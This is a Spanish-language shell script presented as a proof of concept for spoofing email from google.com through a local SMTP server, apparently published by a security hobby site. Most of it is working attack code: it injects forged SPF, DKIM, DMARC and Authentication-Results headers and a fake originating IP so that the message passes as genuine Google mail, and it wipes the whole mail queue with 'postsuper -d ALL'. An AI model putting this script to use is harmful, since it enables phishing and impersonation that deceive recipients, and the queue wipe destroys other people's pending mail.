#!/bin/sh
##############################################################
# Prueba de concepto POC
# suplanta a google[.]com   con envio por smtp en loclahost 
# Añade cabeceras X-Mailer modificadas
# Añade fasifica verificaciones SPF, DKIN, DMARK
# (R) hackingyseguridad.com 2025
# @antonio_taboada
#############################################################

# Elimina otros email en la cola de envio del servidor SMTP
postsuper -d ALL

HOST="localhost"
PORT="25"

send_email_with_retry() {
    local from_email="notifications@google.com"
    local to_email="antonio.taboada@telefonica.net"
    local max_retries=3
    local retry_delay=300  # 5 minutos en segundos

    for attempt in $(seq 1 $max_retries); do
        echo "Intento $attempt de $max_retries - $(date)"

        (
            echo "EHLO google.com"
            sleep 1
            echo "MAIL FROM: <$from_email>"
            sleep 1
            echo "RCPT TO: <$to_email>"
            sleep 1
            echo "DATA"
            sleep 1

            # Cabeceras mejoradas para eludir verificaciones
            echo "From: $from_email"
            echo "To: $to_email"
            echo "Subject: Notificación - Intento $attempt"
            echo "Date: $(date -R)"
            echo "Message-ID: <$(date +%s)@google.com>"
            echo "MIME-Version: 1.0"
            echo "Content-Type: text/plain; charset=\"utf-8\""
            echo "Content-Transfer-Encoding: 7bit"
            echo "X-Mailer: Microsoft Outlook 16.0"
            echo "X-Originating-IP: [8.8.8.8]"
            echo "X-Priority: 3 (Normal)"
            echo "X-MSMail-Priority: Normal"
            echo "X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=20230601; t=$(date +%s); h=from:to:subject:date:message-id:mime-version:content-type; bh=abc123=; b=def456="
            echo "X-Google-SPF: pass (google.com: domain of $from_email designates 8.8.8.8 as permitted sender)"
            echo "X-Authentication-Results: google.com; dkim=pass header.i=@google.com; spf=pass smtp.mailfrom=$from_email; dmarc=pass header.from=google.com"
            echo "Authentication-Results: google.com; dkim=pass header.i=@google.com; spf=pass smtp.mailfrom=$from_email; dmarc=pass header.from=google.com"
            echo "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=20230601; t=$(date +%s); bh=abc123=; h=from:to:subject:date:message-id:mime-version:content-type; b=xyz789="
            echo "Received: from mail-google.com (8.8.8.8) by mx.google.com with SMTP id $(date +%s); $(date -R)"
            echo ""
            echo "hola: "
            echo ""
            echo "Este es un email de pruebas."
            echo "Intento de envío: $attempt"
            echo ""
            echo "Saludos,"
            echo "http://www.hackingyseguridad.com/"
            echo "."
            sleep 1
            echo "QUIT"
        ) | telnet $HOST $PORT 2>&1 > /tmp/email_result.txt

        done
        return 1
}

send_email_with_retry

echo "."
mailq
postqueue -f
echo
echo ".."
echo "..."
sleep 3
postqueue -f
sleep 3
postqueue -f
echo
echo "-> Para limpiar la cola de envio del servidor SMTP en localhost: postsuper -d ALL"
echo
echo "borra la cola de envio .."
echo
echo "postsuper -d ALL "
echo
sleep 3
mailq
echo "...."
echo



